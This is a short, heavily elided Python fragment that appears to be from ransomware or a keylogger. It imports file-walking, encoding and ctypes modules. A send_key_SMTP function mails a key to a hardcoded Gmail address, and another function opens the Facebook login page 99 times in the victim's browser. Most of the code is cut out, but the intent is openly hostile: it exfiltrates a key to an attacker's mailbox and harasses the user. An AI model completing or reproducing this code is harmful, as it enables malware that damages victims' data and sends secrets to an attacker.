import os, fnmatch, struct, random, string, base64, json,ctypes,webbrowser
...
def send_key_SMTP():
    ...
    fromaddr = "vikrantsingh466@gmail.com"
    toaddr = "vikrantsingh466@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
...
def facebook_login_page():
    for i in range(1,100):
        webbrowser.open("https://en-gb.facebook.com/login/",new=1,autoraise=True)
